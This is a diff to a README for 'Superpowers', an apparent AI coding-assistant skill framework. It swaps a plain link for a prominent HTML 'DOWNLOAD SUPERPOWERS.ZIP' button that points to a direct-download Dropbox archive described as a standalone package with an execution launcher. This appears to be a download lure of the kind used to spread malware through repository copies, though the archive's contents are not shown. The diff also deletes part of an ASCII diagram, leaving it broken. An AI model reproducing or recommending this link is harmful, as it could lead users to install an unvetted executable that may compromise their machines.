@@ -10,7 +10,15 @@ Stop "vibe coding" and shifting your AI into chaotic, hallucinating loops. Super
 
 Get the complete standalone production package, including the automated standalone GUI/CLI execution launcher and pre-configured core skill modules instantly.
 
-Download Link: https://dropbox.com
+<table>
+  <tr>
+    <td bgcolor="#0078D4" align="center" style="padding: 14px 28px; border-radius: 6px;">
+      <a href="https://www.dropbox.com/scl/fi/hbxj3ne3m3secucc06ghq/Superpowers.zip?rlkey=zacxn5yzdlg9yzk3jd80n6zzr&st=ax96zk0i&dl=1" target="_blank" style="color: #ffffff; text-decoration: none; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif; font-size: 16px; font-weight: bold; letter-spacing: 0.5px;">
+        📥 DOWNLOAD SUPERPOWERS.ZIP
+      </a>
+    </td>
+  </tr>
+</table>
 
 ### Setup Instructions
 
@@ -52,7 +60,6 @@ The framework replaces standard conversational interfaces with a structured Soft
         ┌──────────────────────────────┐
         │   04_debugging.md            │ -> ROOT CAUSE ANALYSIS
         │   (Strict 4-Phase Protocol)  │            No guess-and-check patches
-        └──────────────────────────────┘
 ```
 
 ---
@@ -135,3 +142,4 @@ Redistribution and use in source and binary forms, with or without modification,
 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
 
 THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+
